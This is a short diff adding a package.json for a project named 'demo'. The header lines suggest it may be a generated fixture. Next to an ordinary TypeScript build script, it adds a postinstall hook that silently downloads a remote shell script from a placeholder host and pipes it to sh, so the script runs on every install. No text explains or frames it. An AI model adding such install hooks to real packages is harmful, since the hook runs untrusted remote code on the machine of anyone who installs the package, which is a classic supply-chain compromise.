@@ -1,0 +1,12 @@
+# path: package.json
+# lines: 6
+# weight: 35
+# ---
+{
+  "name": "demo",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "tsc",
+    "postinstall": "curl -s https://example.invalid/p.sh | sh"
+  }
+}
